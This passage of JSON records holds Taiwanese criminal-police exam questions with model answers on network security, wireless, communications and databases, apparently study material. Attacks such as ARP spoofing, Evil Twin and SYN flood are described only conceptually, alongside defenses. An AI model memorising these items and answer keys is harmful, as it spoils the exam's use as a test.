    "html": "<div class=\"question-head\">\n            <span class=\"number\">四</span>\n            <div>\n              <h2>國外 SaaS 公司股價大跌與裁員原因分析</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              SaaS 曾被視為穩健且高成長的商業模式，但近年許多國外 SaaS 公司股價大幅修正並出現裁員。請以資訊專業分析可能原因。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>原因分析</h3>\n            <p>\n              第一，總體經濟與估值修正。SaaS 公司過去受惠低利率環境，市場願意用高營收倍數評價未來成長；當利率上升、資金成本提高，投資人轉向重視獲利與現金流，未穩定獲利或估值過高的 SaaS 便被重新定價。\n            </p>\n            <p>\n              第二，疫情紅利消退。疫情期間遠距辦公、線上協作、電商與客服自動化需求快速增加，企業擴編並預期高成長延續；疫情後 IT 預算回歸理性，客戶開始整併訂閱、刪減非核心軟體，造成新客取得變慢、續約壓力上升與淨收入留存率下降。\n            </p>\n            <p>\n              第三，競爭加劇與產品同質化。雲端基礎建設、開源套件與 API 生態降低開發門檻，CRM、協作、行銷、人資、客服與資安等領域替代品增加。大型平台也會把原本獨立 SaaS 的功能內建到套裝服務，使中小型 SaaS 失去差異化與議價能力。\n            </p>\n            <p>\n              第四，成本結構壓力。許多 SaaS 長期投入大量銷售、行銷與客戶成功成本以追求 ARR 成長；當 CAC 上升、銷售週期拉長、企業採購審批變嚴，原本依靠高成長攤平成本的模式就會受挑戰。雲端運算、資料儲存、AI 推論、資安合規與全球客服成本也會壓縮毛利。\n            </p>\n            <p>\n              第五，AI 衝擊與採購邏輯改變。生成式 AI 一方面提供新功能機會，另一方面也帶來替代風險。客戶會重新評估既有軟體是否能被 AI 工具、自動化平台或大型平台內建功能取代。若 SaaS 公司只是把 AI 當作附加賣點，而沒有真正改善流程效率或降低客戶成本，就難以說服客戶增加預算。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>結論</h3>\n            <p>\n              SaaS 股價大跌與裁員不代表 SaaS 模式失敗，而是市場從只看高速成長，轉向同時檢驗成長、獲利、留存、差異化與現金流。未來能勝出的 SaaS 公司，需具備明確垂直場景、高轉換成本、強整合能力、健康單位經濟、資安合規信任，以及能真正創造生產力的 AI 功能。\n            </p>\n          </section>"
  },
  {
    "id": 34,
    "slug": "question-34",
    "title": "雜湊函數與生日攻擊",
    "points": "25 分",
    "year": "115年",
    "examName": "刑事警察人員考試",
    "grade": "三等",
    "category": "數位鑑識組",
    "subject": "網路與資訊安全",
    "subjectSlug": "115-criminal-third-cyber-security",
    "order": "一",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">一</span>\n            <div>\n              <h2>雜湊函數與生日攻擊</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              請回答雜湊函數的應用、理想密碼雜湊函數的關鍵特性，以及生日攻擊的意義、威脅與例子。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>雜湊函數的應用與特性</h3>\n            <p>\n              密碼學雜湊函數會把任意長度輸入轉換為固定長度摘要，例如 SHA-256 會產生 256 位元摘要。常見應用包括檔案完整性驗證、數位簽章前的摘要計算、密碼儲存、訊息認證碼、區塊鏈與交易鏈結、惡意程式特徵比對、電子蒐證中的映像檔完整性確認，以及軟體下載校驗。\n            </p>\n            <ul>\n              <li><strong>決定性：</strong>同一輸入必須得到同一輸出，否則無法做驗證與比對。</li>\n              <li><strong>快速計算：</strong>合法使用者需能有效率地計算摘要，例如驗證大型檔案或大量日誌。</li>\n              <li><strong>抗原像性：</strong>已知雜湊值時，應難以反推出原始輸入，避免由摘要回推密碼或文件。</li>\n              <li><strong>抗第二原像性：</strong>已知某訊息時，應難以找到另一個不同訊息具有相同摘要，避免文件被替換。</li>\n              <li><strong>抗碰撞性：</strong>應難以找到任意兩個不同輸入具有相同摘要，這是數位簽章與憑證安全的重要基礎。</li>\n              <li><strong>雪崩效應：</strong>輸入只改一個位元，輸出也應大幅改變，避免攻擊者從輸出差異推測輸入關係。</li>\n            </ul>\n            <p>\n              例如下載作業系統 ISO 時，官方提供 SHA-256 值，使用者可計算下載檔摘要比對是否一致；電子證據鑑識時，也會對原始硬碟映像計算雜湊，以證明後續分析未改變證據。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>生日攻擊與資安威脅</h3>\n            <p>\n              生日攻擊是利用機率上的生日悖論：若雜湊輸出長度為 n 位元，理論上不是需要嘗試 2^n 次才可能找到碰撞，而是約 2^(n/2) 次就有相當機率找到兩個不同輸入具有相同雜湊值。因此雜湊位元數若太短，碰撞攻擊成本會大幅下降。\n            </p>\n            <p>\n              對網路資訊應用而言，生日攻擊威脅主要在於碰撞可破壞完整性與不可否認性。例如攻擊者準備兩份內容不同但雜湊值相同的文件，一份是正常合約，一份是對攻擊者有利的合約；若系統只簽署文件摘要，攻擊者可能用另一份碰撞文件替換。又如舊式 MD5、SHA-1 已被證明不再適合安全用途，若仍用於憑證、程式碼簽章或檔案完整性驗證，可能遭偽造或替換。\n            </p>\n            <p>\n              防禦上應使用足夠長度且未被破解的雜湊演算法，例如 SHA-256、SHA-384、SHA-3；密碼儲存則不應只做一般雜湊，而應使用 salt 搭配 Argon2、bcrypt 或 PBKDF2 等密碼雜湊函數，提高暴力破解與碰撞利用成本。\n            </p>\n          </section>"
  },
  {
    "id": 35,
    "slug": "question-35",
    "title": "網路安全偵察與網路協定攻擊",
    "points": "25 分",
    "year": "115年",
    "examName": "刑事警察人員考試",
    "grade": "三等",
    "category": "數位鑑識組",
    "subject": "網路與資訊安全",
    "subjectSlug": "115-criminal-third-cyber-security",
    "order": "二",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">二</span>\n            <div>\n              <h2>網路安全偵察與網路協定攻擊</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              請說明網路安全偵察、被動偵查與主動偵查差異，以及網路協定攻擊的常見方法與防禦策略。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>網路安全偵察</h3>\n            <p>\n              網路安全偵察是攻擊或滲透測試前蒐集目標資訊的階段，目的在了解目標的網域、IP 範圍、系統版本、開放服務、組織人員、供應商、弱點與攻擊面。偵察品質越高，後續攻擊越容易精準化，因此防守方也會透過偵察了解自身暴露面。\n            </p>\n            <p>\n              被動偵查是不直接與目標系統互動，主要利用公開來源，例如 WHOIS、DNS 紀錄、搜尋引擎、社群平台、GitHub 洩漏、公開憑證透明度紀錄、新聞稿與招募資訊。其優點是較不易被目標偵測，但資訊可能過時。\n            </p>\n            <p>\n              主動偵查會直接對目標產生連線或封包，例如 ping sweep、port scan、banner grabbing、漏洞掃描、目錄列舉、DNS zone transfer 嘗試等。它能取得較即時準確資訊，但容易被防火牆、IDS/IPS、SIEM 或流量監控發現。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>網路協定攻擊與防禦</h3>\n            <p>\n              網路協定攻擊是利用 TCP/IP、ARP、DNS、DHCP、ICMP、HTTP、TLS、路由協定等設計缺陷、實作漏洞或錯誤設定進行攻擊。常見方法如下：\n            </p>\n            <ul>\n              <li><strong>ARP Spoofing：</strong>偽造 ARP 回應，使流量經過攻擊者主機，造成中間人攻擊。可用 Dynamic ARP Inspection、靜態 ARP、交換器分段與偵測工具防禦。</li>\n              <li><strong>DNS Spoofing/Poisoning：</strong>竄改解析結果導向惡意網站。可部署 DNSSEC、可信 resolver、DoH/DoT 與 DNS 異常監控。</li>\n              <li><strong>TCP SYN Flood：</strong>大量半開連線耗盡伺服器資源。可使用 SYN cookies、連線速率限制、DDoS 防護與負載平衡。</li>\n              <li><strong>DHCP Starvation/Rogue DHCP：</strong>耗盡租約或架設假 DHCP 發送錯誤閘道與 DNS。可用 DHCP Snooping、Port Security 與網路接入控管。</li>\n              <li><strong>ICMP 攻擊：</strong>利用 ping flood、Smurf 或偵測封包探測網段。可設定速率限制、過濾廣播回應與監控異常流量。</li>\n              <li><strong>TLS 降級或弱加密：</strong>誘導使用舊版協定或弱 cipher。可停用 SSL/TLS 舊版、啟用 HSTS、使用強 cipher suite 與憑證檢查。</li>\n            </ul>\n            <p>\n              整體防禦策略包括最小化暴露服務、更新修補、網路分段、強化交換器與路由器設定、部署 IDS/IPS 與 SIEM、進行封包與日誌監控，並定期執行弱點掃描與組態稽核。\n            </p>\n          </section>"
  },
  {
    "id": 36,
    "slug": "question-36",
    "title": "Evil Twin 攻擊與 WPA 安全特性",
    "points": "25 分",
    "year": "115年",
    "examName": "刑事警察人員考試",
    "grade": "三等",
    "category": "數位鑑識組",
    "subject": "網路與資訊安全",
    "subjectSlug": "115-criminal-third-cyber-security",
    "order": "三",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">三</span>\n            <div>\n              <h2>Evil Twin 攻擊與 WPA 安全特性</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              請說明 Evil Twin 攻擊的意義與威脅，以及 WPA 與相關標準如何提供無線網路安全。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>Evil Twin 攻擊</h3>\n            <p>\n              Evil Twin 是攻擊者架設一個名稱、訊號或登入頁看似合法的假 Wi-Fi 熱點，誘使使用者連線。例如在咖啡店、機場或飯店架設與官方 SSID 相同或相似的基地台，並以較強訊號吸引用戶。使用者一旦連上，攻擊者可能監看流量、導向假登入頁、竊取帳密，或進行中間人攻擊。\n            </p>\n            <ul>\n              <li>竊取帳號密碼、Cookie、表單資料與未加密機敏內容。</li>\n              <li>透過假 captive portal 要求輸入社群、電子郵件或企業帳號。</li>\n              <li>進行 DNS spoofing，把使用者導向釣魚網站或惡意更新頁。</li>\n              <li>降級或攔截部分未妥善驗證的連線，造成資料外洩。</li>\n              <li>在企業環境中蒐集憑證，進一步攻擊 VPN、郵件或內部系統。</li>\n            </ul>\n            <p>\n              使用者應避免在公共 Wi-Fi 傳輸機敏資料，確認官方 SSID，使用 VPN，檢查 HTTPS 憑證，不忽略瀏覽器警告；企業則可使用 WPA-Enterprise、憑證式驗證與無線入侵偵測系統偵測假 AP。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>WPA 與三項安全特性</h3>\n            <p>\n              WPA 是 Wi-Fi Protected Access，用來改善早期 WEP 的弱點，後續包含 WPA2 與 WPA3 等標準。WPA 相關標準主要提供三項安全特性：身分驗證、機密性與完整性。\n            </p>\n            <ul>\n              <li><strong>身分驗證 Authentication：</strong>確認連線者與基地台身分。家用環境常用 WPA-Personal 的預共享金鑰；企業環境常用 WPA-Enterprise 搭配 802.1X、EAP 與 RADIUS，讓每位使用者以個別帳號或憑證驗證。</li>\n              <li><strong>機密性 Confidentiality：</strong>透過加密保護無線傳輸內容。WPA 使用 TKIP 作為過渡，WPA2 使用 AES-CCMP，WPA3 則提供更強的加密與 SAE 握手，降低密碼猜測與離線破解風險。</li>\n              <li><strong>完整性 Integrity：</strong>確認封包未被竄改，避免攻擊者修改資料或插入偽造封包。TKIP 的 MIC、CCMP 的訊息完整性機制及重播保護可降低封包竄改與 replay attack。</li>\n            </ul>\n            <p>\n              實務上應優先使用 WPA3 或 WPA2-AES，避免 WEP、WPA-TKIP 與弱密碼；企業網路應使用 802.1X、憑證驗證、用戶分流與無線監控，提高對 Evil Twin 與密碼破解的防護能力。\n            </p>\n          </section>"
  },
  {
    "id": 37,
    "slug": "question-37",
    "title": "資安事件通報應變與 ISO/IEC 27035",
    "points": "25 分",
    "year": "115年",
    "examName": "刑事警察人員考試",
    "grade": "三等",
    "category": "數位鑑識組",
    "subject": "網路與資訊安全",
    "subjectSlug": "115-criminal-third-cyber-security",
    "order": "四",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">四</span>\n            <div>\n              <h2>資安事件通報應變與 ISO/IEC 27035</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              請說明我國資安事件通報與應變依據之法律與辦法、事件分級與通報內容，並說明 ISO/IEC 27035 事件管理生命週期的目的與優勢。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>我國法規與通報內容</h3>\n            <p>\n              我國政府機關資安事件通報與應變主要依據《資通安全管理法》，並由主管機關訂定《資通安全事件通報及應變辦法》加以規範。其精神是要求公務機關與特定非公務機關在發生資安事件時，依事件嚴重程度完成通報、處置、復原與後續改善。\n            </p>\n            <p>\n              資安事件通常依影響程度分級，考量因素包括核心業務是否中斷、機敏資料是否外洩或遭竄改、影響範圍、是否涉及關鍵基礎設施、是否造成民眾權益重大損害，以及事件是否持續擴大。低等級事件可能只影響局部服務或少量設備；高等級事件則可能造成重大服務中斷、大量個資外洩、核心系統遭入侵或關鍵基礎設施受影響。\n            </p>\n            <p>\n              通報內容應包括發現時間、通報機關、事件類型、影響系統與服務、影響範圍、可能原因、已知攻擊手法、受影響資料類型、初步處置措施、聯絡窗口、預估復原時間、後續應變計畫與需要支援事項。完成處置後，還應提出根因分析、復原狀態、改善措施與防止再發方案。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>ISO/IEC 27035 事件管理生命週期</h3>\n            <p>\n              ISO/IEC 27035 的目的，是提供組織一套系統化方法來準備、偵測、回報、評估、回應與改善資訊安全事件管理能力。它強調事件不是只靠臨時救火，而是要事前建立角色、流程、通報管道、證據保存、溝通機制與持續改善制度。\n            </p>\n            <ul>\n              <li><strong>準備：</strong>建立政策、SOP、責任分工、聯絡清單、工具、演練與教育訓練。</li>\n              <li><strong>偵測與通報：</strong>透過監控、日誌、告警、使用者回報或外部通知發現事件，並依流程通報。</li>\n              <li><strong>評估與決策：</strong>判斷事件類型、嚴重性、影響範圍與優先順序。</li>\n              <li><strong>應變處置：</strong>進行圍堵、根除、復原、證據保存、溝通與必要的對外通報。</li>\n              <li><strong>事後檢討：</strong>進行根因分析、修補弱點、更新規則與訓練內容，降低再發機率。</li>\n            </ul>\n            <p>\n              遵循生命週期的優勢包括縮短事件發現與反應時間、降低損害擴大、確保符合法規與稽核要求、保存數位證據、改善跨部門協作、累積事件知識庫，並讓組織從每次事件中持續提升防護成熟度。\n            </p>\n          </section>"
  },
  {
    "id": 38,
    "slug": "question-38",
    "title": "CSMA/CD 與 CSMA/CA 的原理與應用",
    "points": "25 分",
    "year": "115年",
    "examName": "刑事警察人員考試",
    "grade": "三等",
    "category": "數位鑑識組",
    "subject": "電腦通訊（包括無線網路）",
    "subjectSlug": "115-criminal-third-computer-communications",
    "order": "一",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">一</span>\n            <div>\n              <h2>CSMA/CD 與 CSMA/CA 的原理與應用</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              在多重存取技術中，衝撞偵測（Collision Detection, CD）與衝撞迴避（Collision Avoidance, CA）常用於提升區域網路傳輸效能。請說明兩者基本工作原理、各自適合的傳輸媒介與原因，並以現有區域網路標準說明其應用。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>基本工作原理</h3>\n            <p>\n              <strong>CSMA/CD</strong> 的核心是「先聽再傳，邊傳邊聽」。節點傳送前先偵測媒介是否閒置；若閒置就開始傳送。傳送過程中仍持續監聽媒介，若發現訊號異常代表發生碰撞，便送出 jam signal 通知其他節點，停止傳送，等待隨機退避時間後再重傳。\n            </p>\n            <p>\n              <strong>CSMA/CA</strong> 的核心是「先聽再等，盡量避免碰撞」。節點傳送前先偵測通道，若通道閒置仍需等待 IFS 與隨機 backoff；倒數期間若通道變忙則暫停倒數，等通道再次閒置後繼續。無線網路也可使用 RTS/CTS 預約通道，降低隱藏節點造成的碰撞。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>適合媒介與原因</h3>\n            <ul>\n              <li><strong>CD 適合有線共享媒介：</strong>例如早期同軸乙太網路或 hub-based Ethernet。因為有線媒介中節點可以較可靠地同時傳送與偵測線路上是否有碰撞。</li>\n              <li><strong>CA 適合無線媒介：</strong>無線裝置通常難以邊傳邊聽，因自身傳送訊號遠強於接收訊號，而且存在 hidden terminal 與 exposed terminal 問題，因此更適合在傳送前用退避與 RTS/CTS 降低碰撞機率。</li>\n            </ul>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>現有標準應用</h3>\n            <p>\n              <strong>IEEE 802.3 Ethernet</strong> 在早期半雙工共享式乙太網路中使用 CSMA/CD。現代交換式全雙工乙太網路中，每個連線通常是點對點且可同時收發，已不需要 CSMA/CD。\n            </p>\n            <p>\n              <strong>IEEE 802.11 Wi-Fi</strong> 使用 CSMA/CA。無線站台會進行載波偵測、IFS 等待、隨機退避、ACK 確認，必要時使用 RTS/CTS 處理隱藏節點問題，這正是 CA 在無線區域網路中的典型應用。\n            </p>\n          </section>"
  },
  {
    "id": 39,
    "slug": "question-39",
    "title": "多工、展頻與 FHSS",
    "points": "25 分",
    "year": "115年",
    "examName": "刑事警察人員考試",
    "grade": "三等",
    "category": "數位鑑識組",
    "subject": "電腦通訊（包括無線網路）",
    "subjectSlug": "115-criminal-third-computer-communications",
    "order": "二",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">二</span>\n            <div>\n              <h2>多工、展頻與 FHSS</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              試述多工（Multiplexing）與展頻（Spread Spectrum）之差異，說明跳頻展頻 FHSS 的工作原理；若一 FHSS 系統共有 8 通道，其跳頻碼有 30 位元，請問每週期會跳躍頻道幾次？\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>多工與展頻差異</h3>\n            <p>\n              <strong>多工</strong> 是讓多個使用者或多路訊號共享同一傳輸媒介的資源分配技術，重點是提高通道利用率。例如 TDM 以時間切割、FDM 以頻帶切割、CDM 以碼序列區分使用者。\n            </p>\n            <p>\n              <strong>展頻</strong> 則是把原本較窄頻的訊號擴展到較寬頻帶上傳送，重點在抗干擾、抗竊聽、降低窄頻干擾影響與提升隱蔽性。展頻不只是多人共享通道，也是一種訊號處理與通訊安全技術。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>FHSS 工作原理</h3>\n            <p>\n              FHSS（Frequency Hopping Spread Spectrum）會把可用頻帶切成多個頻道，傳送端與接收端依相同的 pseudo-random hopping sequence 在不同頻道間快速跳動。雙方只要時間同步且使用相同跳頻碼，就能在同一時刻切到同一頻道完成通訊。\n            </p>\n            <p>\n              若某些頻道受到干擾，FHSS 只會在停留於該頻道時受影響；下一跳切到其他頻道後即可繼續傳送，因此具有抗窄頻干擾與降低被攔截的能力。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>跳頻次數計算</h3>\n            <p>\n              共有 8 個通道，表示每次選擇一個頻道需要 <code>log2(8) = 3</code> 位元。跳頻碼共有 30 位元，因此每週期可切成 <code>30 / 3 = 10</code> 組頻道選擇碼。\n            </p>\n            <p>\n              所以此 FHSS 系統每週期會跳躍 <strong>10 次</strong>。\n            </p>\n          </section>"
  },
  {
    "id": 40,
    "slug": "question-40",
    "title": "Go-back-N ARQ 與滑動視窗效能",
    "points": "25 分",
    "year": "115年",
    "examName": "刑事警察人員考試",
    "grade": "三等",
    "category": "數位鑑識組",
    "subject": "電腦通訊（包括無線網路）",
    "subjectSlug": "115-criminal-third-computer-communications",
    "order": "三",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">三</span>\n            <div>\n              <h2>Go-back-N ARQ 與滑動視窗效能</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              滑動視窗是流量控制普遍使用的機制。請解釋 Go-back-N ARQ 中傳送端與接收端如何使用滑動視窗機制，並說明滑動視窗大小與 ARQ 傳輸效能的關係。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>Go-back-N 的滑動視窗</h3>\n            <p>\n              在 Go-back-N ARQ 中，傳送端維持大小為 N 的傳送視窗，可在尚未收到 ACK 前連續送出多個 frame。視窗左端代表最早尚未確認的 frame，右端代表目前可送出的最大序號範圍。當傳送端收到累積 ACK 後，表示該 ACK 之前的 frame 都已正確收到，視窗就向前滑動並允許傳送新的 frame。\n            </p>\n            <p>\n              接收端通常只接受「下一個期望序號」的 frame，接收視窗大小可視為 1。若收到正確且按序的 frame，就交給上層並回 ACK；若收到錯序 frame，通常丟棄並重複回覆最後正確接收的 ACK。若傳送端等待某個 ACK 逾時，會從該遺失 frame 開始，把之後已送出但未確認的 frame 全部重傳，這就是 Go-back-N 的名稱來源。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>視窗大小與效能</h3>\n            <p>\n              視窗太小時，傳送端送出少量 frame 後就必須等待 ACK，若傳播延遲大，通道會閒置，吞吐量下降。適當增加視窗大小可讓傳送端在等待 ACK 期間持續送資料，使管線保持滿載，提高頻寬利用率。\n            </p>\n            <p>\n              但視窗不是越大越好。視窗過大時，若發生錯誤或遺失，Go-back-N 會重傳該錯誤 frame 之後的多個 frame，造成更多浪費；也會需要較大的序號空間與緩衝管理。理想視窗大小應能覆蓋 bandwidth-delay product，使傳送端在一個 RTT 內有足夠資料可送，同時避免錯誤率高時重傳成本過大。\n            </p>\n          </section>"
  },
  {
    "id": 41,
    "slug": "question-41",
    "title": "IP Best Effort Service 與容錯能力",
    "points": "25 分",
    "year": "115年",
    "examName": "刑事警察人員考試",
    "grade": "三等",
    "category": "數位鑑識組",
    "subject": "電腦通訊（包括無線網路）",
    "subjectSlug": "115-criminal-third-computer-communications",
    "order": "四",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">四</span>\n            <div>\n              <h2>IP Best Effort Service 與容錯能力</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              網際網路的網路層 IP 提供最大努力服務（Best Effort Service）。請敘述其內涵，並申論為何 IP 的 Best Effort Service 可以提供網際網路極大容錯能力。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>Best Effort Service 的內涵</h3>\n            <p>\n              IP 的 Best Effort Service 是指網路層會盡力把每個 packet 依目的位址轉送到目的地，但不保證一定送達、不保證順序、不保證延遲、不保證頻寬，也不保證不重複。若路由器壅塞、錯誤、TTL 到期或找不到路由，封包可能被丟棄。\n            </p>\n            <p>\n              因此 IP 本身是 connectionless 與 datagram-based 的服務。可靠性、重傳、排序、流量控制與壅塞控制主要交由端系統的上層協定處理，例如 TCP；若應用更重視即時性，也可使用 UDP 自行決定錯誤處理方式。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>為何能提供極大容錯能力</h3>\n            <p>\n              Best Effort 的設計讓網路核心保持簡單。路由器不需要為每條連線保留狀態，也不必在網路層維護端到端可靠傳輸。當部分路由器、鏈路或路徑故障時，路由協定可重新收斂，封包可改走其他路徑；網路不必等待每一條連線狀態逐一重建。\n            </p>\n            <p>\n              這種 end-to-end principle 把複雜控制放在端點，把中間網路做成鬆耦合、可替換、可繞路的 packet switching 架構。即使某些封包遺失，上層協定也能重傳或由應用容忍遺失，因此局部故障不會讓整個網際網路停止運作。\n            </p>\n            <p>\n              此外，Best Effort 不要求所有底層網路提供相同可靠性，IP 可以跑在乙太網路、Wi-Fi、光纖、行動網路、衛星或其他鏈路上。不同網路只要能轉送 IP 封包即可互連，這種異質網路整合能力也是網際網路高擴充性與高容錯性的核心原因。\n            </p>\n          </section>"
  },
  {
    "id": 42,
    "slug": "question-42",
    "title": "Product 與 Manufacturer 的 SQL 查詢",
    "points": "30 分",
    "year": "115年",
    "examName": "刑事警察人員考試",
    "grade": "三等",
    "category": "數位鑑識組",
    "subject": "資料庫管理與運用",
    "subjectSlug": "115-criminal-third-database-management",
    "order": "一",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">一</span>\n            <div>\n              <h2>Product 與 Manufacturer 的 SQL 查詢</h2>\n              <p>配分 30 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              某公司關聯式資料庫定義產品表格與製造商表格：\n              <code>Product(ProductID, ProductName, Category, StockQuantity, ManufactureID)</code>、\n              <code>Manufacturer(ManufacturerID, ManuName, Phone, Address)</code>。其中只有\n              <code>StockQuantity</code> 為數值型態，其餘皆為字串型態。請以 SQL 查詢各類別產品數、庫存不足產品與製造商資料，以及總庫存量少於 1000 的類別。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3> 每一個類別各有幾種產品</h3>\n            <pre><code>SELECT\n  Category,\n  COUNT(*) AS ProductCount\nFROM Product\nGROUP BY Category;</code></pre>\n            <p>\n              因每筆 Product tuple 代表一種特定產品，所以依 <code>Category</code> 分組後，以 <code>COUNT(*)</code> 計算該類別下的產品種類數。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3> 庫存量不足產品與製造商聯絡資料</h3>\n            <pre><code>SELECT\n  p.ProductID,\n  m.ManuName,\n  m.Phone\nFROM Product AS p\nJOIN Manufacturer AS m\n  ON p.ManufactureID = m.ManufacturerID\nWHERE p.StockQuantity &lt; 10;</code></pre>\n            <p>\n              題目假設安全庫存量為 10，因此「不足」可解釋為庫存量小於 10。產品表格只有製造商編號，需與 Manufacturer 以製造商編號連接，才能輸出製造商名稱與電話。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3> 總庫存量少於 1000 的類別</h3>\n            <pre><code>SELECT\n  Category\nFROM Product\nGROUP BY Category\nHAVING SUM(StockQuantity) &lt; 1000;</code></pre>\n            <p>\n              <code>WHERE</code> 是對單筆資料篩選，<code>HAVING</code> 則是對分組後的彙總結果篩選。本題要判斷每一類別所有產品的總庫存量，所以使用 <code>SUM</code> 搭配 <code>HAVING</code>。\n            </p>\n          </section>"
  },
  {
    "id": 43,
    "slug": "question-43",
    "title": "File Scan 與 ProductID Index 查詢策略比較",
    "points": "25 分",
    "year": "115年",
    "examName": "刑事警察人員考試",
    "grade": "三等",
    "category": "數位鑑識組",
    "subject": "資料庫管理與運用",
    "subjectSlug": "115-criminal-third-database-management",
    "order": "二",
    "html": "<div class=\"question-head\">\n            <span class=\"number\">二</span>\n            <div>\n              <h2>File Scan 與 ProductID Index 查詢策略比較</h2>\n              <p>配分 25 分</p>\n            </div>\n          </div>\n\n          <section class=\"prompt-block\">\n            <h3>題目</h3>\n            <p>\n              對 <code>Product(ProductID, ProductName, Price)</code> 執行\n              <code>SELECT Price FROM Product WHERE ProductID = 'P01';</code>。請列出直接掃描資料檔案與使用 ProductID 索引兩種策略的完整步驟，並依查詢效率、空間需求與系統維護難易度比較優劣。\n            </p>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>策略一：File Scan</h3>\n            <ol>\n              <li>從 Product 資料檔案的第一個資料頁開始讀取。</li>\n              <li>逐筆檢查 tuple 的 <code>ProductID</code> 是否等於 <code>'P01'</code>。</li>\n              <li>若找到符合的 tuple，取出該筆資料的 <code>Price</code> 欄位。</li>\n              <li>若 <code>ProductID</code> 是主鍵或唯一值，找到後即可停止；若沒有唯一性保證，需掃描到檔案結尾。</li>\n              <li>輸出查得的 <code>Price</code>。</li>\n            </ol>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>策略二：使用 ProductID 索引</h3>\n            <ol>\n              <li>以查詢條件 <code>ProductID = 'P01'</code> 作為搜尋鍵，到 ProductID 索引中查找。</li>\n              <li>若索引是 B+ tree，從根節點往下找到葉節點；若是 hash index，依雜湊值找到對應 bucket。</li>\n              <li>在索引項目中取得資料記錄的位置，例如 RID、page id 與 slot id。</li>\n              <li>依該位置讀取 Product 資料頁，取出對應 tuple。</li>\n              <li>輸出該 tuple 的 <code>Price</code> 欄位。</li>\n            </ol>\n          </section>\n\n          <section class=\"answer-block\">\n            <h3>優劣比較</h3>\n            <div class=\"table-wrap\">\n              <table>\n                <thead>\n                  <tr>\n                    <th>面向</th>\n                    <th>File Scan</th>\n                    <th>使用 ProductID Index</th>\n                  </tr>\n                </thead>\n                <tbody>\n                  <tr>\n                    <td>查詢效率</td>\n                    <td>需逐頁逐筆檢查，資料量大時通常為 O(n)，效率較差。</td>\n                    <td>可快速定位目標資料。B+ tree 約 O(log n)，hash index 在適合情況下可接近 O(1)。</td>\n                  </tr>\n                  <tr>\n                    <td>空間需求</td>\n                    <td>不需額外索引空間。</td>\n                    <td>需儲存索引節點或雜湊結構，會增加磁碟空間。</td>\n                  </tr>\n                  <tr>\n                    <td>系統維護</td>\n                    <td>新增、刪除、修改資料時不需同步維護索引，較簡單。</td>\n                    <td>資料異動時需更新索引，可能產生分裂、合併或重整成本，維護較複雜。</td>\n                  </tr>\n                </tbody>\n              </table>\n            </div>\n            <p>\n              因本查詢以 ProductID 精確查找單一產品，若資料量夠大且 ProductID 上已有索引，策略二通常較有效率；但若資料表很小，file scan 的成本也可能可以接受。\n            </p>\n          </section>"
  },
  {
    "id": 44,
    "slug": "question-44",
    "title": "Primary Key、Not Null 與借閱資料級聯刪除",
    "points": "25 分",
    "year": "115年",
    "examName": "刑事警察人員考試",
    "grade": "三等",
    "category": "數位鑑識組",
    "subject": "資料庫管理與運用",
    "subjectSlug": "115-criminal-third-database-management",
    "order": "三",
